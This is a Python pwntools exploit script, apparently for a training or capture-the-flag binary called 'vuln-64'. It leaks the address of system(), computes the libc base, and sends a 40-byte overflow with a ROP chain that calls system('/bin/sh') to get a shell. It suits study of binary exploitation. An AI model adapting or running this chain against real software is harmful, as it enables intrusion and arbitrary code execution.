from pwn import *

elf = context.binary = ELF('./vuln-64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

p = process()

# Step 1: Leak system() address
p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)
log.info(f'Leaked system: {hex(system_leak)}')

# Step 2: Calculate libc base
libc.address = system_leak - libc.sym['system']
log.success(f'Libc base: {hex(libc.address)}')

# Step 3: Find gadgets and addresses
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))

log.info(f'pop rdi; ret gadget at: {hex(pop_rdi)}')
log.info(f'/bin/sh at: {hex(bin_sh)}')

# Optional: Add a `ret` gadget for stack alignment (some systems crash without it)
ret = rop.find_gadget(['ret'])[0]

# Step 4: Build payload
payload = flat(
    b'A' * 40,
    pop_rdi,
    bin_sh,
    ret,               
    libc.sym['system']
)

# Step 5: Send and interact
p.sendline(payload)
p.interactive()
